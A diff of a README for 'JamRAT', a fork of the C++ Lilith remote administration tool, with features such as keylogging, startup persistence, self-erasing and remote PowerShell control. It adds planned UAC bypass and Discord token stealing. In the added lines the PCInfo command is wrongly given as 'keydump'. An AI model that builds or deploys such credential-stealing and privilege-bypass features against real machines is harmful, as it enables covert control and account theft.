@@ -1,18 +1,13 @@
-# Lilith
+# JamRAT
 [![Build status](https://ci.appveyor.com/api/projects/status/0au5goobwkwhvmgu?svg=true)](https://ci.appveyor.com/project/werkamsus/lilith) [![license](https://img.shields.io/github/license/mashape/apistatus.svg)](https://github.com/werkamsus/Lilith/blob/master/LICENSE)
 
 **Free & Native Open Source C++ Remote Administration Tool for Windows**
 
-Lilith is a console-based ultra light-weight RAT developed in C++. It features a straight-forward set of [commands](#commands) that allows for near complete control of a machine.
+JamRAT is a customized LilithRAT.  This is console-based ultra light-weight RAT developed in C++. It features a straight-forward set of [commands](#commands) that allows for near complete control of a machine.
 
 Disclaimer
 ---
-The use of this software on any device that is not your own is highly discouraged. You need to obtain explicit permission from the owner if you intend to use Lilith in an alien environment, any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.
-
-Youtube
----
-* [Video about the new Features](https://youtu.be/etk2dcx4mi8)
-* [Comprehensive Feature Overview](https://youtu.be/86rPt8oAQK4)
+The use of this software on any device that is not your own is highly discouraged. You need to obtain explicit permission from the owner if you intend to use JamRAT in an alien environment, any illicit installation will likely be prosecuted by the jurisdiction the (ab)use occurs in.
 
 Features
 ---
@@ -27,6 +22,9 @@ Features
 * Multiple Connections
 * Auto-Install
 * Startup Persistence
+* UAC Bypass(Schedule）
+* PCInfo **(new)**
+* Discord token Stealer(Schedule)
 * Self-Erases
 * DNS Resolving
 * Low Latency & Bandwith use
@@ -45,7 +43,7 @@ Commands
 |switchSession|`switchSession <clientID>` (`switchSession 2`)|Switches to another Client|
 |broadcast|`broadcast`|Broadcasts your commands to all clients|
 |keydump|`keydump`|Dumps Keylog File|
-|PCInfo|`PCInfo`|Information about target PC|
+|PCInfo|`keydump`|Information about target PC|
 |script|`script <scriptname> <scriptparameter>` (`script keydump keylog.txt`)|Executes a predefined Script|
 |listClients|`listClients`|Displays the number of clients connected|
 |remoteControl|`remoteControl <C:\program.exe>` OR `remoteControl cmd`|[More Info](#remotecontrol)|
@@ -80,3 +78,7 @@ Requirements
 remoteControl
 ---
 Shortcuts are: `cmd`, `pws`, `pws32` which stand for Command Prompt, Powershell and Powershell 32-Bit respectively. You can use these instead of a full path to the executable. Example: `remoteControl pws` will remote-control `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`.
+
+# Memo
+
+A mechanism must be found to encrypt communications.
